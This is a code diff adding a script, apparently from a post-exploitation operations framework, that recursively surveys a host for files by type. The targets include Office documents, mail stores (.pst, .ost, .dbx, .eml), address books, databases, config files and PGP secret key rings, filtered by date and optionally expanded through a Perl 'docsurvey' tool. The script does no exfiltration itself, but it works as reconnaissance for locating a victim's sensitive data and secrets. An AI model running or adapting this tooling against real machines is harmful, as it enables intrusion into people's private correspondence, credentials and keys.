@@ -1,0 +1,141 @@
+# Called from simple.eps
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:/resources/ep/scripts";
+}
+@record off;
+@echo on;
+
+if (prompt "Do you want to do a full dirwalk/doc survey (since the last time we did one)?") {
+	`local run -command "perl $ScriptsDir/../../../tools/make_docsurvey.pl" -redirect make_docsurvey`;
+	`background script do_docsurvey.eps`;
+} else {
+string $lookfors;
+
+# Microsoft Office files
+$lookfors[0] = ".doc";
+$lookfors[1] = ".xls";
+$lookfors[2] = ".ppt";
+# Visio diagrams
+$lookfors[3] = ".vsd";
+
+string $extended;
+
+# maybe add .dns
+# maybe add extensions for autocad, similar file types
+
+$extended[0] = ".rtf";
+$extended[1] = ".mbx";
+$extended[2] = ".wab";
+$extended[3] = ".tif";
+$extended[4] = ".dbx";
+$extended[5] = ".ost";
+$extended[6] = ".pst";
+$extended[7] = ".mdb";
+$extended[8] = ".cfg";
+# PGP secret key rings; consider having .pkr and .rnd as well
+$extended[9] = ".skr";
+$extended[10] = ".msg";
+$extended[11] = ".net";
+$extended[12] = ".zip";
+$extended[13] = ".tbb";
+$extended[14] = ".pdf";
+$extended[15] = ".log";
+$extended[16] = ".cry";
+$extended[17] = ".ini";
+# SQL Server data files
+$extended[18] = ".mdf";
+$extended[19] = ".eml";
+
+bool $showUsage = false;
+bool $success = true;
+bool $ask = false;
+string $datefrom;
+
+if ($argc <= 1) {
+    $datefrom=GetInput("When do you want a docsurvey since? (type 'all' to get all, 'none' to cancel) ");
+} else if ($argv[1] == "?") {
+    $showUsage = true;
+} else {
+    $datefrom=$argv[1];
+}
+
+if ($argc == 3 ) {
+	if ( $argv[2] == "-fast" ) {
+		$ask = false;
+	}
+}
+
+if ($showUsage) {
+    echo "Usage: $argv[0] <from date|'all'|'none'> ['-fast']";
+	echo "  use 'all' as the date to get all files";
+	echo "  use 'none' as the date to change your mind and get no files";
+    return $success;
+}
+
+bool $date=true;
+if ($datefrom == "fast") {
+	$ask=false;
+	$datefrom=GetInput("When do you want a docsurvey since? (type 'all' to get all, 'none' to cancel) ");
+}
+
+if ($datefrom == "all") {
+	$date=false;
+}
+
+if ($datefrom == "none") {
+	return false;
+}
+
+
+int $i = 0;
+
+while ( $i < sizeof($lookfors) ) {
+	if ( $ask == true ) {
+		if (prompt "Do you want a listing of all $lookfors[$i] files?") {
+			if ($date == false) {
+				`background dir *$lookfors[$i] -path * -recursive -max 0`;
+			} else {
+				`background dir *$lookfors[$i] -path * -recursive -max 0 -after $datefrom`;
+			}
+		}	
+	} else {
+		if ($date == false) {
+			`background dir *$lookfors[$i] -path * -recursive -max 0`;
+		} else {
+			`background dir *$lookfors[$i] -path * -recursive -max 0 -after $datefrom`;
+		}
+	}
+	$i++;
+}
+
+if (prompt "Do you want to do an extended survey?") {
+	$i=0;
+	while ( $i < sizeof($extended) ) {
+		if ( $ask == true ) {
+			if (prompt "Do you want a listing of all $extended[$i] files?") {
+				if ($date == false) {
+					`background dir *$extended[$i] -path * -recursive -max 0`;
+				} else {
+					`background dir *$extended[$i] -path * -recursive -max 0 -after $datefrom`;
+				}
+			}	
+		} else {
+			if ($date == false) {
+				`background dir *$extended[$i] -path * -recursive -max 0`;
+			} else {
+				`background dir *$extended[$i] -path * -recursive -max 0 -after $datefrom`;
+			}
+		}
+		$i++;
+	}
+}
+
+}
+return true;
